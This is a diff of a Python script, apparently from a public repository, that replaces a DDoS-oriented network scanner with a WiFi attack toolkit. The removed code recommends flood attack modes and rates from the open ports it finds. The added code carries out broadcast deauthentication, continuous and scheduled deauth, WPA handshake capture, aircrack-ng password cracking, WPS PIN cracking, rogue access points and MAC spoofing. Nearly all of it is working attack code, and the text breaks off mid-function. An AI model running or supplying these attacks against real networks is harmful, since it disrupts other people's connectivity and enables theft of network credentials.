@@ -1,645 +1,559 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 ### BEGIN INIT INFO
-# Provides:          ddos_toolkit_network_scanner
+# Provides:          wifi_toolkit
 # Required-Start:    $network $remote_fs
 # Required-Stop:     $remote_fs
 # Default-Start:     2 3 4 5
 # Default-Stop:      0 1 6
-# Short-Description: Network Scanner and Security Analyzer (Extension of DDoS Toolkit)
-# Description:       An extension of the DDoS Toolkit, designed for network scanning, vulnerability assessment.
+# Short-Description: WiFi Deauthentication Toolkit
+# Description:       A toolkit designed for WiFi network scanning and deauthentication attacks for ethical cybersecurity testing.
 # Author:
 # + LIONMAD <https://github.com/Midohajhouj>
 # License:           MIT License - https://opensource.org/licenses/MIT
-###  END INIT INFO ###
+#### END INIT INFO ####
+import sys # Install module with pip sys --break-system-packages
+import importlib # Install module with pip importlib --break-system-packages
 
-# ================== Standard Libraries ====================
-import socket
-import threading
-import subprocess
-import sys
-import argparse
-import json
-import os
-import shutil
-import logging
-from concurrent.futures import ThreadPoolExecutor, as_completed
-import asyncio
-import time
-import configparser
-from typing import Dict, List, Optional, Tuple
-from datetime import datetime
-
+def check_library(lib_name):
+    """Checks if a library is installed and prompts to install it if not."""
+    try:
+        importlib.import_module(lib_name)
+    except ImportError:
+        print(f"{lib_name} is not installed.")
+        print(f"Install it using: pip install {lib_name} --break-system-packages")
+        sys.exit(1)
+        
 # ================== Third-Party Libraries ==================
-from colorama import init, Fore, Style
-import requests
-from tabulate import tabulate
-import scapy.all as scapy
+# Check for third-party libraries.
+required_libraries = [
+    "aiohttp", "asyncio", "argparse", "scapy.all", "requests"
+]
+
+import os
+import time
+import threading
+import signal
+import re
+import json
+import subprocess
+import argparse
+from scapy.all import *
+from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, Dot11Auth, Dot11AssoReq
+from colorama import Fore, Style, init
 
 # Initialize colorama
 init(autoreset=True)
 
-# Colors
-GREEN = Fore.GREEN
-RED = Fore.RED
-YELLOW = Fore.YELLOW
-BLUE = Fore.BLUE
-RESET = Style.RESET_ALL
+# Configuration
+SCAN_TIME = 10  # Default scan time in seconds
+CHANNEL_HOP_DELAY = 1  # Delay between channel hops in seconds
 
-# Constants
-DEFAULT_PORTS = [80, 443, 53, 123, 161, 11211]
-LOG_DIR = "/var/log/network_scanner"
-CONFIG_FILE = "config.ini"
+# Global variables to track subprocesses
+running = True
+subprocesses = []
 
-# Common DDoS amplification ports and their descriptions
-DDoS_PORTS = {
-    53: {"service": "DNS", "risk": "High", "description": "DNS amplification attacks"},
-    123: {"service": "NTP", "risk": "High", "description": "NTP amplification attacks"},
-    161: {"service": "SNMP", "risk": "High", "description": "SNMP amplification attacks"},
-    19: {"service": "CHARGEN", "risk": "High", "description": "CHARGEN amplification attacks"},
-    17: {"service": "QOTD", "risk": "Medium", "description": "QOTD amplification attacks"},
-    137: {"service": "NetBIOS", "risk": "Medium", "description": "NetBIOS amplification attacks"},
-    389: {"service": "LDAP", "risk": "High", "description": "LDAP amplification attacks"},
-    1900: {"service": "UPnP", "risk": "Medium", "description": "UPnP amplification attacks"},
-    11211: {"service": "Memcached", "risk": "High", "description": "Memcached amplification attacks"},
-    80: {"service": "HTTP", "risk": "Medium", "description": "Potential HTTP-based attacks (DDoS)"},
-    443: {"service": "HTTPS", "risk": "Medium", "description": "Potential HTTPS-based attacks (DDoS)"}
-}
+# Banner
+BANNER = f"""
+{Fore.YELLOW}WiFi Deauthentication Tool{Style.RESET_ALL}
+"""
 
-# Expanded CVE database for DDoS-related services
-CVE_DATABASE = {
-    "DNS": ["CVE-2020-1350", "CVE-2019-6477", "CVE-2017-14491"],
-    "NTP": ["CVE-2016-7431", "CVE-2015-8138", "CVE-2014-9295"],
-    "SNMP": ["CVE-2017-6742", "CVE-2012-2148", "CVE-2010-3847"],
-    "LDAP": ["CVE-2021-44228", "CVE-2020-15778", "CVE-2019-1309"],
-    "HTTP": ["CVE-2017-5638", "CVE-2018-7600", "CVE-2021-41773"],
-    "HTTPS": ["CVE-2018-11776", "CVE-2020-2551", "CVE-2021-3449"],
-    "Memcached": ["CVE-2018-1000115", "CVE-2016-8704"],
-    "UPnP": ["CVE-2020-12695", "CVE-2013-0229"],
-    "CHARGEN": ["CVE-1999-0635"],
-    "QOTD": ["CVE-1999-0635"],
-    "NetBIOS": ["CVE-1999-0519"]
-}
-
-# Logging configuration
-if not os.path.exists(LOG_DIR):
-    os.makedirs(LOG_DIR)
-
-logging.basicConfig(
-    level=logging.INFO,
-    format="%(asctime)s - %(levelname)s - %(message)s",
-    handlers=[
-        logging.FileHandler(os.path.join(LOG_DIR, "network_scanner.log")),
-        logging.StreamHandler()
-    ]
-)
-
-logger = logging.getLogger(__name__)
-
-# ================== External Tools Integration ==================
-
-def run_nmap_scan(ip: str, options: List[str] = None) -> None:
-    """Run a local Nmap scan with customizable options."""
-    if options is None:
-        options = ["-sV", "-p", "80,443,53,123,161,11211"]
-    
-    logger.info(f"Running Nmap scan on {ip} with options: {' '.join(options)}...")
+def check_library(lib_name):
+    """Checks if a library is installed and prompts to install it if not."""
     try:
-        nmap_result = subprocess.run(["nmap"] + options + [ip], capture_output=True, text=True)
-        if nmap_result.returncode == 0:
-            logger.info("Nmap scan successful")
-            print(nmap_result.stdout)
-        else:
-            logger.error("Nmap scan failed")
-            print(nmap_result.stderr)
-    except FileNotFoundError:
-        logger.error("Nmap not found. Please install Nmap to run this scan.")
+        importlib.import_module(lib_name)
+    except ImportError:
+        print(f"{lib_name} is not installed.")
+        print(f"Install it using: pip install {lib_name} --break-system-packages")
+        sys.exit(1)
 
-def run_metasploit_scan(ip: str, port: int) -> None:
-    """Run a Metasploit scan on a specific port."""
-    logger.info(f"Running Metasploit scan on {ip}:{port}...")
-    try:
-        msf_command = f"use auxiliary/scanner/portscan/tcp\nset RHOSTS {ip}\nset PORTS {port}\nrun\nexit\n"
-        result = subprocess.run(["msfconsole", "-q", "-x", msf_command], capture_output=True, text=True)
-        if result.returncode == 0:
-            logger.info("Metasploit scan successful")
-            print(result.stdout)
-        else:
-            logger.error("Metasploit scan failed")
-            print(result.stderr)
-    except FileNotFoundError:
-        logger.error("Metasploit not found. Please install Metasploit to run this scan.")
+# ================== Third-Party Libraries ==================
+# Check for third-party libraries.
+required_libraries = [
+    "scapy", "colorama"
+]
 
-def run_shodan_scan(ip: str, api_key: str) -> None:
-    """Run a Shodan scan on the target IP."""
-    logger.info(f"Running Shodan scan on {ip}...")
+for lib in required_libraries:
+    # Handle libraries with dot notation like 'scapy.all'
+    check_library(lib.split(".")[0])
+
+# Libraries are now guaranteed to be installed. Import them.
+import scapy.all as scapy
+from colorama import Fore, Style, init
+
+def signal_handler(sig, frame):
+    """Handle Ctrl+C to gracefully exit the script."""
+    global running
+    print(f"{Fore.YELLOW}\n[*] Ctrl+C detected. Stopping all processes...{Style.RESET_ALL}")
+    running = False
+    for proc in subprocesses:
+        os.system(f"sudo pkill {proc}")
+    reset_interface(interface)
+    sys.exit(0)
+
+def check_root():
+    """Check if the script is run with root privileges."""
+    if os.geteuid() != 0:
+        print(f"{Fore.RED}[!] This script must be run as root. Use 'sudo'.{Style.RESET_ALL}")
+        sys.exit(1)
+
+def set_monitor_mode(interface):
+    """Set the wireless interface to monitor mode."""
+    print(f"{Fore.YELLOW}[*] Setting interface {interface} to monitor mode...{Style.RESET_ALL}")
+    os.system(f"sudo ifconfig {interface} down")
+    os.system(f"sudo iwconfig {interface} mode monitor")
+    os.system(f"sudo ifconfig {interface} up")
+
+def reset_interface(interface):
+    """Reset the wireless interface to managed mode."""
+    print(f"{Fore.YELLOW}[*] Resetting interface {interface} to managed mode...{Style.RESET_ALL}")
+    os.system(f"sudo ifconfig {interface} down")
+    os.system(f"sudo iwconfig {interface} mode managed")
+    os.system(f"sudo ifconfig {interface} up")
+
+def channel_hop(interface, delay=CHANNEL_HOP_DELAY):
+    """Hop through all available channels."""
+    channels = list(range(1, 15)) + [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165]
+    for channel in channels:
+        if not running:
+            break
+        os.system(f"sudo iwconfig {interface} channel {channel}")
+        print(f"{Fore.YELLOW}[*] Switching to channel {channel}...{Style.RESET_ALL}")
+        time.sleep(delay)
+
+def process_packet(packet, networks):
+    """Process each packet to extract WiFi network details."""
+    if packet.haslayer(Dot11Beacon):
+        ssid = packet[Dot11Elt].info.decode()
+        bssid = packet[Dot11].addr2  # MAC address of the access point
+        try:
+            channel = int(ord(packet[Dot11Elt:3].info))  # Channel number
+        except:
+            channel = "N/A"
+        strength = packet.dBm_AntSignal  # Signal strength in dBm
+        if (ssid, bssid) not in [(n[0], n[1]) for n in networks]:  # Avoid duplicates
+            networks.append((ssid, bssid, channel, strength))
+
+def wifi_scan(interface, scan_time=SCAN_TIME):
+    """Scan for WiFi networks."""
+    print(f"{Fore.YELLOW}[*] Scanning for WiFi networks on interface {interface}...{Style.RESET_ALL}")
+    networks = []
     try:
-        url = f"https://api.shodan.io/shodan/host/{ip}?key={api_key}"
-        response = requests.get(url)
-        if response.status_code == 200:
-            logger.info("Shodan scan successful")
-            print(json.dumps(response.json(), indent=4))
-        else:
-            logger.error(f"Shodan scan failed: {response.status_code}")
-            print(response.text)
+        sniff(iface=interface, prn=lambda x: process_packet(x, networks), timeout=scan_time)
     except Exception as e:
-        logger.error(f"Error running Shodan scan: {e}")
-        
-# ================== Main Script Functions ==================
-
-def resolve_domain_to_ip(domain: str) -> Optional[str]:
-    """Resolve a domain name to an IP address."""
-    try:
-        ip = socket.gethostbyname(domain)
-        logger.info(f"Resolved {domain} to IP: {ip}")
-        return ip
-    except socket.gaierror as e:
-        logger.error(f"Could not resolve domain: {domain}. Error: {e}")
-        return None
-    except Exception as e:
-        logger.error(f"Unexpected error resolving domain: {domain}. Error: {e}")
-        return None
-
-def scan_port(ip: str, port: int) -> bool:
-    """Scan a single TCP port on the target IP."""
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(1)
-        result = sock.connect_ex((ip, port))
-        return result == 0
-    except Exception as e:
-        logger.warning(f"Error scanning port {port}: {e}")
-        return False
+        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
     finally:
-        sock.close()
+        return networks
 
-def scan_udp_port(ip: str, port: int) -> bool:
-    """Scan a single UDP port on the target IP."""
+def deauth_attack_aireplay(interface, bssid, continuous=False):
+    """Perform a deauthentication attack using aireplay-ng."""
+    print(f"{Fore.YELLOW}[*] Starting deauthentication attack using aireplay-ng on BSSID: {bssid}...{Style.RESET_ALL}")
     try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.settimeout(1)
-        sock.sendto(b'', (ip, port))
-        data, _ = sock.recvfrom(1024)
-        return True
-    except socket.timeout:
-        return False
-    except Exception as e:
-        logger.warning(f"Error scanning UDP port {port}: {e}")
-        return False
-    finally:
-        sock.close()
-
-async def scan_port_async(ip: str, port: int) -> bool:
-    """Asynchronously scan a single TCP port on the target IP."""
-    try:
-        reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=1)
-        writer.close()
-        await writer.wait_closed()
-        return True
-    except:
-        return False
-
-async def scan_udp_port_async(ip: str, port: int) -> bool:
-    """Asynchronously scan a single UDP port on the target IP."""
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.settimeout(1)
-        sock.sendto(b'', (ip, port))
-        await asyncio.wait_for(sock.recvfrom(1024), timeout=1)
-        return True
-    except socket.timeout:
-        return False
-    except Exception as e:
-        logger.warning(f"Error scanning UDP port {port}: {e}")
-        return False
-    finally:
-        sock.close()
-
-async def scan_ports_batch(ip: str, ports: List[int], udp: bool = False) -> List[bool]:
-    """Scan a batch of ports asynchronously."""
-    tasks = [scan_udp_port_async(ip, port) if udp else scan_port_async(ip, port) for port in ports]
-    results = await asyncio.gather(*tasks)
-    return results
-
-def rate_limited_scan(ip: str, port: int, delay: int = 1) -> bool:
-    """Scan a port with a delay to avoid rate limiting."""
-    time.sleep(delay)
-    return scan_port(ip, port)
-
-def detect_firewall(ip: str) -> Optional[bool]:
-    """Detect if a firewall is present using ICMP ping."""
-    try:
-        response = subprocess.run(["ping", "-c", "1", ip], capture_output=True, text=True)
-        if "1 received" in response.stdout:
-            logger.info("Firewall not detected (ICMP allowed)")
-            return False
+        if continuous:
+            print(f"{Fore.YELLOW}[*] Continuous deauthentication attack started. Press Ctrl+C to stop.{Style.RESET_ALL}")
+            while running:
+                os.system(f"sudo aireplay-ng --deauth 0 -a {bssid} {interface}")
+                time.sleep(1)  # Delay between attacks
         else:
-            logger.warning("Firewall detected (ICMP blocked)")
-            return True
+            os.system(f"sudo aireplay-ng --deauth 0 -a {bssid} {interface}")
     except Exception as e:
-        logger.error(f"Error detecting firewall: {e}")
-        return None
+        print(f"{Fore.RED}[!] Error during deauthentication attack: {e}{Style.RESET_ALL}")
 
-def check_cves(service: str) -> List[str]:
-    """Check for common CVEs related to a service."""
-    return CVE_DATABASE.get(service, [])
+def deauth_attack_scapy(interface, bssid, continuous=False):
+    """Perform a deauthentication attack using scapy."""
+    print(f"{Fore.YELLOW}[*] Starting deauthentication attack using scapy on BSSID: {bssid}...{Style.RESET_ALL}")
+    try:
+        if continuous:
+            print(f"{Fore.YELLOW}[*] Continuous deauthentication attack started. Press Ctrl+C to stop.{Style.RESET_ALL}")
+            while running:
+                packet = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / Dot11Deauth()
+                sendp(packet, iface=interface, count=10, inter=0.1)
+                time.sleep(1)  # Delay between attacks
+        else:
+            packet = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / Dot11Deauth()
+            sendp(packet, iface=interface, count=10, inter=0.1)
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error during deauthentication attack: {e}{Style.RESET_ALL}")
 
-def scan_for_ddos_vulnerabilities(ip: str) -> List[Dict]:
-    """Scan for common DDoS amplification ports and classify them."""
-    results = []
-    with ThreadPoolExecutor(max_workers=10) as executor:
-        futures = {executor.submit(scan_port_thread, ip, port, info): port for port, info in DDoS_PORTS.items()}
-        for future in as_completed(futures):
-            results.append(future.result())
-    return results
-
-async def scan_for_ddos_vulnerabilities_async(ip: str) -> List[bool]:
-    """Asynchronously scan for common DDoS amplification ports."""
-    tasks = [scan_port_async(ip, port) for port in DDoS_PORTS.keys()]
-    results = await asyncio.gather(*tasks)
-    return results
-
-def scan_http_https(ip: str) -> List[Dict]:
-    """Check if HTTP or HTTPS ports (80, 443) are open and vulnerable."""
-    results = []
-    for port in [80, 443]:
-        open_port = scan_port(ip, port)
-        if open_port:
-            service = DDoS_PORTS[port]["service"]
-            cves = check_cves(service)
-            results.append({
-                "port": port,
-                "service": service,
-                "status": "Open",
-                "risk": DDoS_PORTS[port]["risk"],
-                "description": DDoS_PORTS[port]["description"],
-                "cves": cves
-            })
-    return results
-
-def scan_port_thread(ip: str, port: int, info: Dict) -> Dict:
-    """Thread function to scan a port and check for vulnerabilities."""
-    is_open = scan_port(ip, port)
-    if is_open:
-        cves = check_cves(info["service"])
-        return {
-            "port": port,
-            "service": info["service"],
-            "status": "Open",
-            "risk": info["risk"],
-            "description": info["description"],
-            "cves": cves
-        }
+def deauth_attack(interface, bssid, continuous=False):
+    """Perform a deauthentication attack using the best available method."""
+    if os.system("which aireplay-ng > /dev/null 2>&1") == 0:
+        deauth_attack_aireplay(interface, bssid, continuous)
     else:
-        return {
-            "port": port,
-            "service": info["service"],
-            "status": "Closed",
-            "risk": "None",
-            "description": "No DDoS risk",
-            "cves": []
-        }
+        print(f"{Fore.YELLOW}[*] aireplay-ng not found. Falling back to scapy for deauthentication.{Style.RESET_ALL}")
+        deauth_attack_scapy(interface, bssid, continuous)
 
-def print_scan_report(scan_results: List[Dict]) -> None:
-    """Print the scan results in a tabular format."""
-    headers = ["Port", "Service", "Status", "Risk", "Description", "CVEs"]
-    table_data = []
-    
-    for result in scan_results:
-        cve_list = ", ".join(result["cves"]) if result["cves"] else "None"
-        table_data.append([
-            result["port"],
-            result["service"],
-            result["status"],
-            result["risk"],
-            result["description"],
-            cve_list
-        ])
-    
-    print(tabulate(table_data, headers, tablefmt="pretty"))
+def print_networks(networks):
+    """Print detected networks, separating 2.4 GHz and 5 GHz."""
+    print(f"\n{Fore.YELLOW}[*] Detected WiFi networks:{Style.RESET_ALL}")
+    print(f"\n{Fore.CYAN}2.4 GHz Networks:{Style.RESET_ALL}")
+    for i, (ssid, bssid, channel, strength) in enumerate(networks):
+        if channel in range(1, 15):
+            print(f"{Fore.GREEN}{i + 1}. SSID: {ssid}, BSSID: {bssid}, Channel: {channel}, Signal Strength: {strength} dBm{Style.RESET_ALL}")
 
-def generate_html_report(scan_results: List[Dict], filename: str = "scan_report.html") -> None:
-    """Generate an HTML report."""
-    html_report = """
-    <html>
-    <head>
-        <title>Network Security Scan Report</title>
-        <style>
-            table { width: 100%; border-collapse: collapse; }
-            th, td { border: 1px solid black; padding: 8px; text-align: left; }
-            th { background-color: #f2f2f2; }
-        </style>
-    </head>
-    <body>
-        <h1>Network Security Scan Report</h1>
-        <h2>Scan Results</h2>
-        <table>
-            <tr><th>Port</th><th>Service</th><th>Status</th><th>Risk</th><th>Description</th><th>CVEs</th></tr>
-    """
-    
-    for result in scan_results:
-        cve_list = ", ".join(result["cves"]) if result["cves"] else "None"
-        html_report += f"""
-            <tr>
-                <td>{result['port']}</td>
-                <td>{result['service']}</td>
-                <td>{result['status']}</td>
-                <td>{result['risk']}</td>
-                <td>{result['description']}</td>
-                <td>{cve_list}</td>
-            </tr>
-        """
-    
-    html_report += """
-        </table>
-    </body>
-    </html>
-    """
-    
-    filepath = os.path.join(LOG_DIR, filename)
-    with open(filepath, "w") as file:
-        file.write(html_report)
-    logger.info(f"HTML report saved to {filepath}")
+    print(f"\n{Fore.CYAN}5 GHz Networks:{Style.RESET_ALL}")
+    for i, (ssid, bssid, channel, strength) in enumerate(networks):
+        if channel not in range(1, 15):
+            print(f"{Fore.GREEN}{i + 1}. SSID: {ssid}, BSSID: {bssid}, Channel: {channel}, Signal Strength: {strength} dBm{Style.RESET_ALL}")
 
-def save_scan_results_to_json(scan_results: List[Dict], filename: str = "scan_results.json") -> None:
-    """Save scan results to a JSON file."""
-    filepath = os.path.join(LOG_DIR, filename)
-    with open(filepath, "w") as file:
-        json.dump(scan_results, file, indent=4)
-    logger.info(f"Scan results saved to {filepath}")
-
-def load_config() -> Dict:
-    """Load configuration from a file."""
-    config = configparser.ConfigParser()
-    config.read(CONFIG_FILE)
-    return config
-
-def save_config(config: Dict) -> None:
-    """Save configuration to a file."""
-    with open(CONFIG_FILE, 'w') as configfile:
-        config.write(configfile)
-
-def analyze_scan_results(scan_results: List[Dict]) -> Dict:
-    """Analyze scan results and suggest the best attack mode, threads, and rate."""
-    suggestions = {
-        "attack_mode": None,
-        "threads": 10,  # Default number of threads
-        "rate": 100,    # Default rate (requests per second)
-    }
-
-    # Analyze open ports and services
-    open_ports = [result for result in scan_results if result["status"] == "Open"]
-    tcp_ports = [port for port in open_ports if port["service"] in ["HTTP", "HTTPS", "DNS"]]
-    udp_ports = [port for port in open_ports if port["service"] in ["DNS", "NTP", "SNMP", "Memcached"]]
-
-    # Suggest attack mode based on open ports
-    if tcp_ports:
-        suggestions["attack_mode"] = "SYN Flood"
-    elif udp_ports:
-        suggestions["attack_mode"] = "UDP Flood"
-    else:
-        suggestions["attack_mode"] = "ICMP Flood"
-
-    # Adjust threads and rate based on the number of open ports
-    if len(open_ports) > 5:
-        suggestions["threads"] = 50
-        suggestions["rate"] = 500
-    elif len(open_ports) > 2:
-        suggestions["threads"] = 20
-        suggestions["rate"] = 200
-
-    return suggestions
-
-def print_suggestions(suggestions: Dict) -> None:
-    """Print the attack suggestions."""
-    print("\nAttack Suggestions:")
-    print(f"Attack Mode: {suggestions['attack_mode']}")
-    print(f"Threads: {suggestions['threads']}")
-    print(f"Rate: {suggestions['rate']} requests per second")
-
-def interactive_mode() -> None:
-    """Run the scanner in interactive mode."""
-    target = input("Enter target IP or domain: ")
-    ip = resolve_domain_to_ip(target)
-    if not ip:
-        print("Invalid target.")
+def spoof_mac(interface, new_mac):
+    """Spoof the MAC address of the attacking machine."""
+    if not re.match(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", new_mac):
+        print(f"{Fore.RED}[!] Invalid MAC address format.{Style.RESET_ALL}")
         return
-    
-    print(f"Scanning target: {ip}")
-    scan_results = scan_for_ddos_vulnerabilities(ip)
-    print_scan_report(scan_results)
+    print(f"{Fore.YELLOW}[*] Changing MAC address to {new_mac}...{Style.RESET_ALL}")
+    os.system(f"sudo ifconfig {interface} down")
+    os.system(f"sudo ifconfig {interface} hw ether {new_mac}")
+    os.system(f"sudo ifconfig {interface} up")
 
-    # Analyze scan results and suggest attack mode
-    suggestions = analyze_scan_results(scan_results)
-    print_suggestions(suggestions)
+def inject_packet(interface, packet):
+    """Inject a custom packet into the network."""
+    print(f"{Fore.YELLOW}[*] Injecting custom packet...{Style.RESET_ALL}")
+    try:
+        sendp(packet, iface=interface)
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error during packet injection: {e}{Style.RESET_ALL}")
 
-    # Offer to save results
-    save = input("Do you want to save the results? (y/n): ")
-    if save.lower() == 'y':
-        save_scan_results_to_json(scan_results)
+def capture_handshake(interface, bssid, output_file):
+    """Capture WPA handshake for offline cracking."""
+    print(f"{Fore.YELLOW}[*] Capturing WPA handshake for BSSID: {bssid}...{Style.RESET_ALL}")
+    try:
+        os.system(f"sudo airodump-ng --bssid {bssid} --write {output_file} --output-format pcap {interface}")
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error during handshake capture: {e}{Style.RESET_ALL}")
 
-async def main_async():
-    """Main function to run the advanced network scanner asynchronously."""
-    parser = argparse.ArgumentParser(description="Advanced Network Scanner and Security Analyzer")
-    parser.add_argument("-t", "--target", required=True, help="Target IP address or domain name")
-    parser.add_argument("-i", "--interactive", action="store_true", help="Run in interactive mode")
-    parser.add_argument("-m", "--multiple", nargs="+", help="Scan multiple targets")
-    parser.add_argument("-p", "--ports", nargs="+", type=int, help="Custom ports to scan")
-    parser.add_argument("-s", "--sniff", action="store_true", help="Enable packet sniffing")
-    parser.add_argument("-a", "--analyze", action="store_true", help="Analyze HTTP headers")
+def list_connected_clients(interface, bssid):
+    """List clients connected to a specific AP."""
+    print(f"{Fore.YELLOW}[*] Listing clients connected to BSSID: {bssid}...{Style.RESET_ALL}")
+    try:
+        os.system(f"sudo airodump-ng --bssid {bssid} --write /tmp/clients --output-format csv {interface}")
+        with open("/tmp/clients-01.csv", "r") as f:
+            for line in f:
+                if "Station MAC" in line:
+                    continue
+                print(line.strip())
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error listing connected clients: {e}{Style.RESET_ALL}")
+
+def create_rogue_ap(interface, ssid, channel):
+    """Create a rogue access point."""
+    print(f"{Fore.YELLOW}[*] Creating rogue AP with SSID: {ssid} on channel {channel}...{Style.RESET_ALL}")
+    try:
+        os.system(f"sudo airbase-ng -e {ssid} -c {channel} {interface}")
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error creating rogue AP: {e}{Style.RESET_ALL}")
+
+def crack_wps_pin(interface, bssid):
+    """Attempt to crack the WPS PIN of a vulnerable router."""
+    print(f"{Fore.YELLOW}[*] Attempting to crack WPS PIN for BSSID: {bssid}...{Style.RESET_ALL}")
+    try:
+        os.system(f"sudo reaver -i {interface} -b {bssid} -vv")
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error cracking WPS PIN: {e}{Style.RESET_ALL}")
+
+def packet_sniff(interface, filter_mac=None):
+    """Sniff packets on a specific interface."""
+    print(f"{Fore.YELLOW}[*] Starting packet sniffing on interface {interface}...{Style.RESET_ALL}")
+    try:
+        if filter_mac:
+            sniff(iface=interface, prn=lambda x: x.summary() if x.addr2 == filter_mac else None, store=False)
+        else:
+            sniff(iface=interface, prn=lambda x: x.summary(), store=False)
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error during packet sniffing: {e}{Style.RESET_ALL}")
+
+def network_stats(interface):
+    """Display real-time network statistics."""
+    print(f"{Fore.YELLOW}[*] Displaying network statistics for interface {interface}...{Style.RESET_ALL}")
+    try:
+        os.system(f"sudo ifconfig {interface}")
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error displaying network statistics: {e}{Style.RESET_ALL}")
+
+def craft_packet():
+    """Craft a custom packet."""
+    print(f"{Fore.YELLOW}[*] Crafting a custom packet...{Style.RESET_ALL}")
+    try:
+        packet = Ether() / IP(dst="192.168.1.1") / TCP(dport=80)
+        print(f"{Fore.YELLOW}[*] Packet crafted: {packet.summary()}{Style.RESET_ALL}")
+        return packet
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error crafting packet: {e}{Style.RESET_ALL}")
+
+def automated_attack(interface, bssid):
+    """Run an automated attack script."""
+    print(f"{Fore.YELLOW}[*] Running automated attack on BSSID: {bssid}...{Style.RESET_ALL}")
+    try:
+        print(f"{Fore.YELLOW}[*] Starting deauthentication attack...{Style.RESET_ALL}")
+        deauth_attack(interface, bssid, continuous=True)
+        print(f"{Fore.YELLOW}[*] Capturing WPA handshake...{Style.RESET_ALL}")
+        capture_handshake(interface, bssid, "handshake")
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error during automated attack: {e}{Style.RESET_ALL}")
+
+def save_config(config, filename="config.json"):
+    """Save configuration to a file."""
+    print(f"{Fore.YELLOW}[*] Saving configuration to {filename}...{Style.RESET_ALL}")
+    try:
+        with open(filename, "w") as f:
+            json.dump(config, f)
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error saving configuration: {e}{Style.RESET_ALL}")
+
+def load_config(filename="config.json"):
+    """Load configuration from a file."""
+    print(f"{Fore.YELLOW}[*] Loading configuration from {filename}...{Style.RESET_ALL}")
+    try:
+        with open(filename, "r") as f:
+            return json.load(f)
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error loading configuration: {e}{Style.RESET_ALL}")
+        return {}
+
+def wifi_network_map(interface):
+    """Create a visual map of nearby WiFi networks."""
+    print(f"{Fore.YELLOW}[*] Creating WiFi network map for interface {interface}...{Style.RESET_ALL}")
+    try:
+        os.system(f"sudo airodump-ng --write /tmp/network_map --output-format csv {interface}")
+        with open("/tmp/network_map-01.csv", "r") as f:
+            for line in f:
+                print(line.strip())
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error creating WiFi network map: {e}{Style.RESET_ALL}")
+
+def detect_client_isolation(interface, bssid):
+    """Detect if client isolation is enabled on a network."""
+    print(f"{Fore.YELLOW}[*] Detecting client isolation for BSSID: {bssid}...{Style.RESET_ALL}")
+    try:
+        os.system(f"sudo aireplay-ng --test -a {bssid} {interface}")
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error detecting client isolation: {e}{Style.RESET_ALL}")
+
+def discover_hidden_ssids(interface):
+    """Discover hidden SSIDs by analyzing probe requests and responses."""
+    print(f"{Fore.YELLOW}[*] Discovering hidden SSIDs on interface {interface}...{Style.RESET_ALL}")
+    try:
+        os.system(f"sudo airodump-ng --hidden --write /tmp/hidden_ssids --output-format csv {interface}")
+        with open("/tmp/hidden_ssids-01.csv", "r") as f:
+            for line in f:
+                print(line.strip())
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error discovering hidden SSIDs: {e}{Style.RESET_ALL}")
+
+def time_based_attack(interface, bssid, start_time, duration):
+    """Schedule a deauthentication attack to run at a specific time."""
+    print(f"{Fore.YELLOW}[*] Scheduling deauthentication attack on BSSID: {bssid} to start at {start_time}...{Style.RESET_ALL}")
+    try:
+        start_time = datetime.strptime(start_time, "%Y-%m-%d %H:%M:%S")
+        while datetime.now() < start_time:
+            time.sleep(1)
+        print(f"{Fore.YELLOW}[*] Starting deauthentication attack...{Style.RESET_ALL}")
+        deauth_attack(interface, bssid, continuous=True)
+        time.sleep(duration)
+        print(f"{Fore.YELLOW}[*] Stopping deauthentication attack...{Style.RESET_ALL}")
+        running = False
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error during time-based attack: {e}{Style.RESET_ALL}")
+
+def signal_strength_visualization(interface, bssid):
+    """Visualize signal strength over time for a specific network or client."""
+    print(f"{Fore.YELLOW}[*] Visualizing signal strength for BSSID: {bssid}...{Style.RESET_ALL}")
+    try:
+        os.system(f"sudo airodump-ng --bssid {bssid} --write /tmp/signal_strength --output-format csv {interface}")
+        with open("/tmp/signal_strength-01.csv", "r") as f:
+            for line in f:
+                print(line.strip())
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error visualizing signal strength: {e}{Style.RESET_ALL}")
+
+def generate_report(filename="report.html"):
+    """Generate a detailed report in HTML format."""
+    print(f"{Fore.YELLOW}[*] Generating report: {filename}...{Style.RESET_ALL}")
+    try:
+        with open(filename, "w") as f:
+            f.write("<html><body><h1>WiFi Toolkit Report</h1></body></html>")
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error generating report: {e}{Style.RESET_ALL}")
+
+def integrate_aircrack(interface, bssid, wordlist):
+    """Integrate with aircrack-ng for WEP/WPA cracking."""
+    print(f"{Fore.YELLOW}[*] Running aircrack-ng on BSSID: {bssid}...{Style.RESET_ALL}")
+    try:
+        os.system(f"sudo aircrack-ng -b {bssid} -w {wordlist} /tmp/handshake-01.cap")
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error running aircrack-ng: {e}{Style.RESET_ALL}")
+
+def integrate_tshark(interface, filter):
